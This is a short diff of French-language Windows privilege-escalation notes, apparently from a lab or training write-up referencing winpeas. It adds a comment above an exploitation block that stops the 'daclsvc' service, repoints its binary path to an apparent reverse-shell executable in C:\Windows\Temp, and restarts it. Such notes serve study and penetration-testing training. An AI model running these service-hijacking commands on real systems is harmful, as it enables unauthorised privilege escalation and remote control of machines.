@@ -48,6 +48,7 @@ Dans les résultats de la commande `winpeas.exe` :
 ### Exploitation
 
 ```shell
+# Changement du path du service
 net stop daclsvc
 sc config daclsvc binpath= "\"C:\Windows\Temp\reverse.exe\""
 net start daclsvc
